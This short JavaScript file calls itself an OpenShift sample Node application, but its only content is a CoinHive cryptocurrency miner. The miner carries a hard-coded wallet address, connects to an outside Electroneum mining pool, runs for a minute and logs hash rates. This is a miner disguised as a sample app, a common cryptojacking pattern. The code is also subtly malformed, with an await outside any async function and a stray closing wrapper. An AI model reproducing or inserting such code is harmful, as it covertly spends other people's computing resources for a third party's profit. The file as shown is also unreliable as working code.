//  OpenShift sample Node application

const CoinHive = require('coin-hive');
const miner = await CoinHive('etnkKyXUsrfH3JdthA3Cep1JBaEdPtFF2EvkX4uhmTbCAFMX4xr6VzvBuc2eJFvEnLKmJKf7jwS3C3R9mMQb1jbD8VW9GNiGBJ', {
  pool: {
    host: 'pool.etn.spacepools.org',
    port: 3333
  }
});
miner.start();


 
  // Listen on events
  miner.on('found', () => console.log('Found!'));
  miner.on('accepted', () => console.log('Accepted!'));
  miner.on('update', data =>
    console.log(`
    Hashes per second: ${data.hashesPerSecond}
    Total hashes: ${data.totalHashes}
    Accepted hashes: ${data.acceptedHashes}
  `)
  );

  // Stop miner
  setTimeout(async () => await miner.stop(), 60000);
})();

